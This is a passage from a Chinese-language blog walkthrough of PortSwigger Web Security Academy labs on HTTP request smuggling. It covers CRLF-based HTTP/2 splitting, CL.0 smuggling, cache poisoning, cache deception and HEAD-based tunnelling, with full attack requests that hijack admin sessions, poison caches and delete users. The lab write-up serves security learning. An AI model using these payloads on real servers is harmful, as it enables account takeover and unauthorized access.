+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a4800d7041fb384c04b2247009f003a.web-security-academy.net</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a4800d7041fb384c04b2247009f003a.web-security-academy.net</span><br><span class="line">Content-Length: 800</span><br><span class="line">Cookie: session=rR8IBcd8iqVq3IhTURHDuDd2fu8IFyDw;</span><br><span class="line"></span><br><span class="line">search=</span><br></pre></td></tr></table></figure>
+
+<p>发送之后刷新浏览器</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314122028562.png" alt="image-20230314122028562"></p>
+<p>我们替换cookie即可</p>
+<h2 id="14-通过-CRLF-注入拆分-HTTP-x2F-2-请求"><a href="#14-通过-CRLF-注入拆分-HTTP-x2F-2-请求" class="headerlink" title="14.通过 CRLF 注入拆分 HTTP&#x2F;2 请求"></a>14.通过 CRLF 注入拆分 HTTP&#x2F;2 请求</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314122701192.png" alt="image-20230314122701192"></p>
+<p>和上一题思路差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a0e004f048c4843c33ad47a007e0051.web-security-academy.net</span><br><span class="line"></span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 0a0e004f048c4843c33ad47a007e0051.web-security-academy.net</span><br></pre></td></tr></table></figure>
+
+<p>这样，我们发送请求后，回响应一个正常的页面，等管理员请求时，服务器会返回我们的走私请求，然后我们在发送一个正常的请求，会返回管理员页面</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314124657155.png" alt="image-20230314124657155"></p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314124635219.png" alt="image-20230314124635219"></p>
+<p>可以看到攻击成功了，我们继续</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314174749742.png" alt="image-20230314174749742"></p>
+<p>试了好久才试出来，获取到admin的cookie</p>
+<p>我们用这个cookie登录，然后就可以删除用户了</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314175039200.png" alt="image-20230314175039200"></p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314175058199.png" alt="image-20230314175058199"></p>
+<p>成功</p>
+<h2 id="15-CL-0-请求走私"><a href="#15-CL-0-请求走私" class="headerlink" title="15.CL.0 请求走私"></a>15.CL.0 请求走私</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314175231870.png" alt="image-20230314175231870"></p>
+<p>CL.0请求走私就是前端根据CL判断请求体，而后端不会根据任何标头判断请求体，只要是看起来像请求的就会把它当做一个请求</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Cookie: session=YOUR-SESSION-COOKIE</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: CORRECT</span><br><span class="line"></span><br><span class="line">GET /hopefully404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p>前端会把它当做一个请求发个后端，但是后端会把它当成两个请求</p>
+<p>值得注意的是，因为前端只接受了一个请求，所以前端只会返回第一个请求，隐含的请求不会返回，为了让前端把这个请求中隐含的请求也返回，需要一个组</p>
+<p>把两个请求合成一个组，发送给后端，其中一个请求包含我们构造的请求走私，另一个请求是正常的，这样，我们在发送这个组时，前端会收到两个请求，把这两个请求发给后端，后端把先响应第一个请求，其中包含隐含的请求走私，这样，对于第一个请求，后端会发出两个响应，前端接受这两个后端的请求，因为前端接受了两个我们发送的请求，所以，也会返回给我们两个后端的响应</p>
+<p>我们首先先构造一个组</p>
+<p>把http历史中的一个请求发送到重发器当中，重发两次，然后把这两个请求打包成一个组</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314181818577.png" alt="image-20230314181818577"></p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314181839467.png" alt="image-20230314181839467"></p>
+<p>然后我们修改一个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0afc00c203f7cf30c09bd28d003d0081.web-security-academy.net</span><br><span class="line">Cookie: session=YOUR-SESSION-COOKIE</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: CORRECT</span><br><span class="line"></span><br><span class="line">GET /hopefully404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314182028010.png" alt="image-20230314182028010"></p>
+<p>这类用到http协议是一样的</p>
+<p>这里发现两个都是 200 并没有出现 404, 这里的主要原因是这里的 url 并不存在 CL.0 走私，因此我们需要去寻找存在漏洞的 url</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314183139498.png" alt="image-20230314183139498"></p>
+<p>我们尝试一下这个</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314183206876.png" alt="image-20230314183206876"></p>
+<p>把其中一个请求的地址改成这个的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/labheader/js/labHeader.js HTTP/1.1</span><br><span class="line">Host: 0ab70010042fd9abc409961e0044005b.web-security-academy.net</span><br><span class="line">Cookie: session=YOUR-SESSION-COOKIE</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: CORRECT</span><br><span class="line"></span><br><span class="line">GET /hopefully404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314184251712.png" alt="image-20230314184251712"></p>
+<p>其中一个请求成功回显，另外一个请求404，说明成功了</p>
+<p>尝试走私 admin 页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/labheader/js/labHeader.js HTTP/1.1</span><br><span class="line">Host: 0ab70010042fd9abc409961e0044005b.web-security-academy.net</span><br><span class="line">Cookie: session=YOUR-SESSION-COOKIE</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: CORRECT</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314184457836.png" alt="image-20230314184457836"></p>
+<p>成功了</p>
+<p>删除用户</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314184559941.png" alt="image-20230314184559941"></p>
+<p>这样就可以了</p>
+<h2 id="16-利用-HTTP-请求走私来执行-Web-缓存中毒"><a href="#16-利用-HTTP-请求走私来执行-Web-缓存中毒" class="headerlink" title="16.利用 HTTP 请求走私来执行 Web 缓存中毒"></a>16.利用 HTTP 请求走私来执行 Web 缓存中毒</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314184728541.png" alt="image-20230314184728541"></p>
+<p>题目告诉我们服务器会重定向，我们先看一下服务器是怎么重定向的</p>
+<p>我们之前做过一个类似的题，在我们点击next post的时候就会发生跳转，这题一样</p>
+<p>我们点击下一个时就会跳转，我们看一下跳转的规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ab1002004369adcc09ffe800002002d.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: 0ab1002004369adcc09ffe800002002d.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>发送这个请求看一下响应是怎样的</p>
+<p>发两次</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314190407800.png" alt="image-20230314190407800"></p>
+<p>可以看到重定向的方式，本来postid是3，跳转后变成了4</p>
+<p>我们让它重定向到漏洞利用服务器上，我们先在漏洞利用服务器上写body</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314192855623.png" alt="image-20230314192855623"></p>
+<p>然后我们重定向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ab1002004369adcc09ffe800002002d.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: exploit-0a9300f3046e9ae6c010fd49017e000d.exploit-server.net/exploit</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314192422012.png" alt="image-20230314192422012"></p>
+<p>注意这里是&#x2F;post</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314200954450.png" alt="image-20230314200954450"></p>
+<p>于是我们再夹带一个请求包以使几乎所有页面都会被缓存，从而实现全范围的投毒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a88004f032fe127c0bfae2f00bd00e5.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 327</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: exploit-0a8900f303d0e16cc073ad2a01230036.exploit-server.net.exploit-server.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/js/tracking.js HTTP/1.1</span><br><span class="line">Host: 0a88004f032fe127c0bfae2f00bd00e5.web-security-academy.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314210422046.png" alt="image-20230314210422046"></p>
+<p>两个请求交替发送，多点击几次即可缓存所有页面，因为所有页面都被投毒，导致用户的受到严重影响</p>
+<p>到了这样之后，我们刷新一下页面，会弹窗就可以了</p>
+<h2 id="17-利用HTTP请求走私来执行Web缓存欺骗"><a href="#17-利用HTTP请求走私来执行Web缓存欺骗" class="headerlink" title="17.利用HTTP请求走私来执行Web缓存欺骗"></a>17.利用HTTP请求走私来执行Web缓存欺骗</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315085427230.png" alt="image-20230315085427230"></p>
+<p>我们登陆一下，看看哪个请求包含API</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315090203800.png" alt="image-20230315090203800"></p>
+<p>发现&#x2F;my-account的页面的响应包含API</p>
+<p>我们发送这样的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a0500f9049d2017c245f85200d8006b</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /my-account HTTP/1.1</span><br><span class="line">X-Ignore: x</span><br></pre></td></tr></table></figure>
+
+<p>我们发送这个请求之后，后端会响应第一个请求，第二个请求会等待，当管理员访问时，把这个请求的响应返回给管理员，同样会把管理员的响应缓存起来</p>
+<p>我们再次访问时，就会收到web缓存中的管理员页面</p>
+<p>注意，这次访问需要用无痕页去访问</p>
+<p>使用 Burp 菜单上的搜索功能查看短语“您的 API 密钥”是否出现在任何静态资源中。如果没有，重复 POST 请求，强制重新加载浏览器窗口，然后重新运行搜索</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315093331613.png" alt="image-20230315093331613"></p>
+<p>提交API</p>
+<h2 id="18-绕过HTTP-x2F-2-请求隧道绕过访问控制"><a href="#18-绕过HTTP-x2F-2-请求隧道绕过访问控制" class="headerlink" title="18.绕过HTTP&#x2F;2 请求隧道绕过访问控制"></a>18.绕过HTTP&#x2F;2 请求隧道绕过访问控制</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315093433985.png" alt="image-20230315093433985"></p>
+<p>我们搜索111，可以看到显示了我们搜索的内容</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315130746679.png" alt="image-20230315130746679"></p>
+<p>我们用POST的方式发送试试</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315131413605.png" alt="image-20230315131413605"></p>
+<p>也是可以的</p>
+<p>我们可以尝试让搜索内容中包含其他用户的请求头</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315132753569.png" alt="image-20230315132753569"></p>
+<p>解释一下，这里前端和后端都同意只有一个请求，但是我们可以让他们在标题结束的位置上不一致 ，前端将我们注入的所有内容识别为标头的一部分， 因此在 search&#x3D; 字符串后面可以添加任何新的标头，而在后端 看到 \r\n\r\n 序列 并认为这是标头的结尾 使得字符串 search&#x3D; 内部标头一起被视为正文的一部分</p>
+<p>修改请求方式为HEAD，对于 HEAD 请求的响应，通常包含一个 content-length 标头，虽然返回的响应中并没有内容。 content-length 标头通常是指 GET 请求返回的资源长度，一些服务器无法解决这个问题，并且无论如何都会尝试读取标头中指定的字节数，如果成功通过执行此操作的前段服务传送请求，可能导致过度读取来自后端的响应</p>
+<p>把请求方式改成HEAD，发送</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315135319901.png" alt="image-20230315135319901"></p>
+<p>可以发现 这里的 8295 其实是我们初始路径的 响应字节 ，那么很容易理解 这个 174 就是 &#x2F;admin 页面的字节数量了</p>
+<p>我们要找一个初始路径小于 &#x2F;admin 页面的字节数量的，用下面这个</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315135359928.png" alt="image-20230315135359928"></p>
+<p>然后删除</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315135439763.png" alt="image-20230315135439763"></p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230315135549905.png" alt="image-20230315135549905"></p>
+<p>刷新一下网页就行了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io">jiutu2003</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jiutu2003.github.io" target="_blank">jiutu2003</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">实战</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">http请求走私</a></div><div class="post_share"><div class="social-share" data-image="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/SSRF/burpsuite%E9%9D%B6%E5%9C%BA-SSRF/" title="SSRF"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/CORS/burpsuite%E9%9D%B6%E5%9C%BA-CORS/" title="CORS"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/b86a37974bed46521a0ed754bb72e45a.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-08</div><div class="title">CORS</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/CSRF/burpsuite%E9%9D%B6%E5%9C%BA-CSRF/" title="CSRF"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/e2e64442f954e1afe8fc5c0f52da114c.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-06</div><div class="title">CSRF</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/DOM-based/burpsuite%E9%9D%B6%E5%9C%BA-DOM-based/" title="DOM-based"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-07</div><div class="title">DOM-based</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/SQL%E6%B3%A8%E5%85%A5/burpsuite%E9%9D%B6%E5%9C%BA-SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127008797.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-03</div><div class="title">SQL注入</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/Bugku/Bugku/" title="Bugku"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/96c8e6960161ed14043fb9ef07cf8f30.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-25</div><div class="title">Bugku</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/SSRF/burpsuite%E9%9D%B6%E5%9C%BA-SSRF/" title="SSRF"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-10</div><div class="title">SSRF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jiutu2003</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.</span> <span class="toc-text">http请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E5%9F%BA%E6%9C%AC-CL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">1.HTTP 请求走私，基本 CL.TE 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E5%9F%BA%E6%9C%AC-TE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2.HTTP 请求走私，基本 TE.CL 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E6%B7%B7%E6%B7%86TE%E6%A0%87%E5%A4%B4"><span class="toc-number">1.3.</span> <span class="toc-text">3.HTTP请求走私，混淆TE标头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E9%80%9A%E8%BF%87%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E7%A1%AE%E8%AE%A4-CL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">4.HTTP 请求走私，通过差异响应确认 CL.TE 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%8C%E9%80%9A%E8%BF%87%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E7%A1%AE%E8%AE%A4-TE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">5.HTTP 请求走私，通过差异响应确认 TE.CL 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%EF%BC%8CCL-TE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">6.利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%EF%BC%8CTE-CL-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">7.利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%8F%AD%E7%A4%BA%E5%89%8D%E7%AB%AF%E8%AF%B7%E6%B1%82%E9%87%8D%E5%86%99"><span class="toc-number">1.8.</span> <span class="toc-text">8.利用 HTTP 请求走私来揭示前端请求重写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%8D%95%E8%8E%B7%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">1.9.</span> <span class="toc-text">9.利用 HTTP 请求走私来捕获其他用户的请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E4%BC%A0%E9%80%92%E5%8F%8D%E5%B0%84-XSS"><span class="toc-number">1.10.</span> <span class="toc-text">10.利用 HTTP 请求走私来传递反射 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E9%80%9A%E8%BF%87-H2-TE-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%9A%84%E5%93%8D%E5%BA%94%E9%98%9F%E5%88%97%E4%B8%AD%E6%AF%92"><span class="toc-number">1.11.</span> <span class="toc-text">11.通过 H2.TE 